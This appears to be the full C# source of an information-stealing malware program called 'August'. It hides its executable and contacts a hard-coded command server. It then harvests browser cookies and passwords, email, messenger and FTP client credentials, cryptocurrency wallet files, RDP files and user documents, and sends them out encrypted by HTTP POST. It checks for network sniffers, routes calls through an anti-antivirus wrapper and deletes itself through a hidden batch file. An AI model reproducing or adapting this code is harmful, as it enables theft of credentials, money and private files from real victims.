using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Collections.Generic;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;

namespace August
{
    public class Program
    {
        /*private static string[] Gate =
        {
            "http://tiendasmasqueundetalle.com/modules/mod_wrapper/config.inc.php",
            "http://abrahams.ch/websheets/marc_fritschi/config.inc.php"
        };*/
        private static string Gate = "http://excelcenter.ro/port10/gate/";
        //private static int GateId = 0;
        public static string Seperator = "<!s@az$>";
        private static CookieContainer Cookies = new CookieContainer();
        private static Process Aug = Process.GetCurrentProcess();

        public static void Main(string[] Args)
        {
            try
            {
                File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
            }
            catch { }
            string[] Config = null;
            try
            {
                //Config = CheckGate();
                Config = Talk(new List<string> { Utils.GetHwid(), Utils.GetOsName(), Environment.UserName }, 4, 9).Split(new string[] { Seperator }, StringSplitOptions.None);
            }
            catch { }
            if (Config.Length != 0)
            {
                try
                {
                    if (Config[1] == "1")
                    {
                        List<List<string>> Cookies = (List<List<string>>)Utils.FuckAV("GetMozCookieData", new object[] { });
                        foreach (var Cookies_ in Cookies)
                        {
                            string Result = String.Empty;
                            foreach (var Cookie in Cookies_)
                                Result += Cookie + "\r\n";
                            Talk(new List<string> { Result }, 25, 30);
                        }
                        Cookies = (List<List<string>>)Utils.FuckAV("GetCookieData", new object[] { });
                        foreach (var Cookies_ in Cookies)
                        {
                            string Result = String.Empty;
                            foreach (var Cookie in Cookies_)
                                Result += Cookie + "\r\n";
                            Talk(new List<string> { Result }, 25, 30);
                        }
                    }
                }
                catch { }
                try
                {
                    if (Config[2] == "1")
                    {
                        SearchOption Opt = SearchOption.TopDirectoryOnly;
                        if (Config[5] == "2") Opt = SearchOption.AllDirectories;
                        if (Config[10] == "3")
                        {
                            foreach (var Filt in Config[3].Split('|'))
                            {
                                foreach (var Drive in DriveInfo.GetDrives())
                                {
                                    if (Drive.IsReady)
                                    {
                                        foreach (var Lama in Directory.GetFiles(Drive.Name, Filt, Opt))
                                        {
                                            try
                                            {
                                                if (new FileInfo(Lama).Length > int.Parse(Config[4])) continue;
                                                string Flue = BitConverter.ToString(File.ReadAllBytes(Lama)).Replace("-", String.Empty);
                                                string Fler = Path.GetFileName(Lama);
                                                Talk(new List<string> { Fler, Flue }, 15, 19);
                                            }
                                            catch { }
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            string Folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                            if (Config[10] == "2") Folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                            foreach (var Filt in Config[3].Split('|'))
                            {
                                foreach (var Lama in Directory.GetFiles(Folder, Filt, Opt))
                                {
                                    try
                                    {
                                        if (new FileInfo(Lama).Length > int.Parse(Config[4])) continue;
                                        string Flue = BitConverter.ToString(File.ReadAllBytes(Lama)).Replace("-", String.Empty);
                                        string Fler = Path.GetFileName(Lama);
                                        Talk(new List<string> { Fler, Flue }, 15, 19);
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
                catch { }
                string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                try
                {
                    if (Config[7] == "1")
                    {
                        string Result = String.Empty;
                        var Grown = Grab.LiveMessenger();
                        if (Grown != null && Grown.Count != 0)
                        {
                            foreach (var Io in Grown)
                            {
                                if (Io.Length == 2)
                                {
                                    string Temp = "Live" + "<;!:;>" + Io[0] + "<;!:;>" + Io[1] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        if (Directory.Exists(AppData + "/"))
                        {
                            foreach (var Xml in GetFiles(AppData + "/", "accounts.xml"))
                            {
                                try
                                {
                                    if (Xml.Contains(".purple"))
                                    {
                                        var Pidgin = Grab.Pidgin(Xml);
                                        if (Pidgin == null)
                                            continue;
                                        foreach (var F in Pidgin)
                                        {
                                            string Temp = F[0] + "<;!:;>" + F[1] + "<;!:;>" + F[2] + "<:;:!>";
                                            if (!Result.Contains(Temp))
                                                Result += Temp;
                                        }
                                    }
                                    else
                                    {
                                        var Psi = Grab.Psi(Xml);
                                        if (Psi == null)
                                            continue;
                                        foreach (var F in Psi)
                                        {
                                            string Temp = "Psi<;!:;>" + F[0] + "<;!:;>" + F[1] + "<:;:!>";
                                            if (!Result.Contains(Temp))
                                                Result += Temp;
                                        }
                                    }
                                }
                                catch { }
                            }
                            Talk(new List<string> { Result }, 56, 60);
                        }
                    }
                }
                catch { }
                try
                {
                    if (Config[8] == "1")
                    {
                        foreach (var Dbase in GetFiles(AppData + "\\Globalscape", "sm.dat"))
                        {
                            try
                            {
                                string TempPath = Path.GetTempPath() + '/' + Utils.GetRandomString(Utils.GetRandomNumber(3, 24)) + ".aug";
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                                File.Copy(Dbase, TempPath);
                                string Bytes = BitConverter.ToString(File.ReadAllBytes(TempPath));
                                string Folly = Bytes.Replace("-", String.Empty);
                                Talk(new List<string> { new FileInfo(Dbase).Name, Folly }, 81, 86);
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                            }
                            catch { }
                        }
                        string Result = String.Empty;
                        try
                        {
                            var Com = Grab.TotalCommander();
                            if (Com != null)
                            {
                                foreach (var F in Com)
                                {
                                    string Temp = F[0] + "<;!:;>" + F[1] + "<;!:;>" + F[2] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        catch { }
                        try
                        {
                            var Win = Grab.WinSCP();
                            if (Win != null)
                            {
                                foreach (var F in Win)
                                {
                                    string Temp = F[0] + "<;!:;>" + F[1] + "<;!:;>" + F[2] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        catch { }
                        try
                        {
                            var Core = Grab.CoreFTP();
                            if (Core != null)
                            {
                                foreach (var F in Core)
                                {
                                    string Temp = F[0] + ":" + F[1] + "<;!:;>" + F[2] + "<;!:;>" + F[3] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        catch { }
                        if (Directory.Exists(AppData + "/SmartFTP"))
                        {
                            foreach (var Xml in GetFiles(AppData + "/SmartFTP", "*.xml"))
                            {
                                var Smart = Grab.SmartFTP(Xml);
                                if (Smart == null)
                                    continue;
                                foreach (var F in Smart)
                                {
                                    string Temp = F[0] + ":" + F[1] + "<;!:;>" + F[2] + "<;!:;>" + F[3] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        if (Directory.Exists(AppData + "/FileZilla"))
                        {
                            foreach (var Xml in GetFiles(AppData + "/FileZilla", "recentservers.xml|sitemanager.xml"))
                            {
                                var Fzilla = Grab.FileZilla(Xml);
                                if (Fzilla == null)
                                    continue;
                                foreach (var F in Fzilla)
                                {
                                    string Temp = F[0] + ":" + F[1] + "<;!:;>" + F[2] + "<;!:;>" + F[3] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        Talk(new List<string> { Result }, 46, 55);
                    }
                }
                catch { }
                try
                {
                    if (Config[0] == "1")
                    {
                        string Result = String.Empty;
                        try
                        {
                            var Moz = Grab.Mozilla("Firefox");
                            if (Moz != null) Result += Moz;
                        }
                        catch { }
                        try
                        {
                            List<string[]> LoginData = (List<string[]>)Utils.FuckAV("GetSavedPasswords", null);
                            if (LoginData != null)
                            {
                                foreach (var Olly in LoginData)
                                {
                                    string Temp = Olly[0] + "<;!:;>" + Olly[1] + "<;!:;>" + Olly[2] + "<:;:!>";
                                    if (!Result.Contains(Temp))
                                        Result += Temp;
                                }
                            }
                        }
                        catch { }
                        Talk(new List<string> { Result }, 10, 14);
                    }
                }
                catch { }
                try
                {
                    if (Config[11] == "1")
                    {
                        string Result = String.Empty;
                        try
                        {
                            var Moz = Grab.Mozilla("Thunderbird");
                            if (Moz != null) Result += Moz;
                        }
                        catch { }
                        try
                        {
                            var Logs = (List<string[]>)Utils.FuckAV("GetOutlookPasswords", null);
                            if (Logs.Count != 0)
                            {
                                foreach (var Data in Logs)
                                {
                                    Result += Data[0] + "<;!:;>" + Data[1] + "<;!:;>" + Data[2] + "<:;:!>";
                                }
                            }
                        }
                        catch { }
                        Talk(new List<string> { Result }, 71, 80);
                    }
                }
                catch { }
                try
                {
                    if (Config[6] == "1")
                    {
                        foreach (var Wallet in GetFiles(AppData + "/Bither", "address.db"))
                        {
                            try
                            {
                                string TempPath = Path.GetTempPath() + '/' + Utils.GetRandomString(Utils.GetRandomNumber(3, 24)) + ".aug";
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                                File.Copy(Wallet, TempPath);
                                string Bytes = BitConverter.ToString(File.ReadAllBytes(TempPath));
                                string Folly = Bytes.Replace("-", String.Empty);
                                Talk(new List<string> { new FileInfo(Wallet).Name, Folly, GetWalletType(TempPath).ToString() }, 40, 45);
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                            }
                            catch { }
                        }
                        foreach (var Wallet in GetFiles(AppData + "/Electrum/wallets", "*"))
                        {
                            try
                            {
                                string TempPath = Path.GetTempPath() + '/' + Utils.GetRandomString(Utils.GetRandomNumber(3, 24)) + ".aug";
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                                File.Copy(Wallet, TempPath);
                                string Bytes = BitConverter.ToString(File.ReadAllBytes(TempPath));
                                string Folly = Bytes.Replace("-", String.Empty);
                                Talk(new List<string> { new FileInfo(Wallet).Name, Folly, GetWalletType(TempPath).ToString() }, 40, 45);
                                if (File.Exists(TempPath)) File.Delete(TempPath);
                            }
                            catch { }
                        }
                        foreach (var Drive in DriveInfo.GetDrives())
                        {
                            if (Drive.IsReady)
                            {
                                foreach (var Wallet in GetFiles(Drive.Name, "wallet.dat"))
                                {
                                    try
                                    {
                                        string TempPath = Path.GetTempPath() + '/' + Utils.GetRandomString(Utils.GetRandomNumber(3, 24)) + ".aug";
                                        if (File.Exists(TempPath)) File.Delete(TempPath);
                                        File.Copy(Wallet, TempPath);
                                        string Bytes = BitConverter.ToString(File.ReadAllBytes(TempPath));
                                        string Folly = Bytes.Replace("-", String.Empty);
                                        Talk(new List<string> { new FileInfo(Wallet).Name, Folly, GetWalletType(TempPath).ToString() }, 40, 45);
                                        if (File.Exists(TempPath)) File.Delete(TempPath);
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
                catch { }
                try
                {
                    if (Config[9] == "1")
                    {
                        foreach (var Drive in DriveInfo.GetDrives())
                        {
                            if (Drive.IsReady)
                            {
                                foreach (var Lama in GetFiles(Drive.Name, "*.rdp"))
                                {
                                    try
                                    {
                                        if (new FileInfo(Lama).Length > int.Parse(Config[4])) continue;
                                        string Flue = BitConverter.ToString(File.ReadAllBytes(Lama)).Replace("-", String.Empty);
                                        string Fler = Path.GetFileName(Lama);
                                        Talk(new List<string> { Fler, Flue }, 61, 70);
                                    }
                                    catch { }
                                }
                            }
                        }
                    }
                }
                catch { }
            }
            try
            {
                File.SetAttributes(Application.ExecutablePath, FileAttributes.Normal);
                string PathVar = Path.GetTempPath() + "/" + Utils.GetRandomString(Utils.GetRandomNumber(1, 16)) + ".bat";
                if (File.Exists(PathVar)) File.Delete(PathVar);
                File.WriteAllText(PathVar, "timeout 5\ndel \"" + Application.ExecutablePath + "\ndel \"%~f0\"");
                Process.Start(new ProcessStartInfo { FileName = PathVar, WindowStyle = ProcessWindowStyle.Hidden });
                Aug.Kill();
            }
            catch { }
        }
        /*private static string[] CheckGate()
        {
            if (Protection.IsSniffing())
            {
                Thread.Sleep(20000);
                return CheckGate();
            }
            try
            {
                var Res = Talk(new List<string> { Utils.GetHwid(), Utils.GetOsName(), Environment.UserName }, 4, 9).Split(new string[] { Seperator }, StringSplitOptions.None);
                if(Res.Length == 1)
                {
                    if (GateId >= Gate.Length)
                    {
                        Application.Exit();
                    }
                    else
                    {
                        GateId++;
                        return CheckGate();
                    }
                }
                else return Res;
            }
            catch
            {
                if (GateId >= Gate.Length)
                {
                    Application.Exit();
                }
                else
                {
                    GateId++;
                    return CheckGate();
                }
            }
            return null;
        }*/
        private static string Talk(List<string> Cats, short KeyMinSize, short KeyMaxSize)
        {
            if (KeyMinSize > KeyMaxSize) return null;
            if (Protection.IsSniffing())
            {
                Thread.Sleep(20000);
                return Talk(Cats, KeyMinSize, KeyMaxSize);
            }
            try
            {
                string UKey = Utils.GetRandomString(Utils.GetRandomNumber(KeyMinSize, KeyMaxSize));
                Cats.Insert(0, UKey);
                string EnData = Data.Encrypt(String.Join(Seperator, Cats.ToArray()), UKey);
                HttpWebRequest Request = (HttpWebRequest)HttpWebRequest.Create(new Uri(Gate)/*[GateId]*/);
                Request.AllowAutoRedirect = true;
                Request.MaximumAutomaticRedirections = 2;
                Request.Method = "POST";
                Request.UserAgent = Data.Encrypt(UKey);
                Request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
                Request.Timeout = 100000;
                Request.ContentType = "application/x-www-form-urlencoded";
                if (Cookies != null) Request.CookieContainer = Cookies;
                byte[] SentData = Encoding.UTF8.GetBytes("q=" + EnData);
                Request.ContentLength = SentData.Length;
                Stream SendStream = Request.GetRequestStream();
                SendStream.Write(SentData, 0, SentData.Length);
                SendStream.Close();
                HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();
                if (Cookies != null) Cookies.Add(Response.Cookies);
                StreamReader SReader = new StreamReader(Response.GetResponseStream(), Encoding.UTF8);
                string Out = SReader.ReadToEnd();
                return Data.Decrypt(Out, UKey);
            }
            catch { return String.Empty; }
        }
        private static List<string> GetFiles(string Path, string Mask)
        {
            List<string> Results = new List<string>();
            string[] Masks = Mask.Split('|');
            foreach (var Mask_ in Masks)
            {
                Results.AddRange((List<string>)Utils.FuckAV("GetFiles", new object[] { Path, Mask_ }));
            }
            return Results;
        }
        private static ushort GetWalletType(string FileName)
        {
            ushort Wall = 1;
            string Content = File.ReadAllText(FileName);
            Content = Content.Remove(0, Content.IndexOf("name") + 4);
            if (new Regex(@"[13][a-km-zA-HJ-NP-Z0-9]{26,33}", RegexOptions.None).IsMatch(Content))
                Wall = 2;
            else if (new Regex(@"D[a-km-zA-HJ-NP-Z0-9]{26,33}", RegexOptions.None).IsMatch(Content))
                Wall = 3;
            else if (new Regex(@"L[a-km-zA-HJ-NP-Z0-9]{26,33}", RegexOptions.None).IsMatch(Content))
                Wall = 4;
            return Wall;
        }
    }
}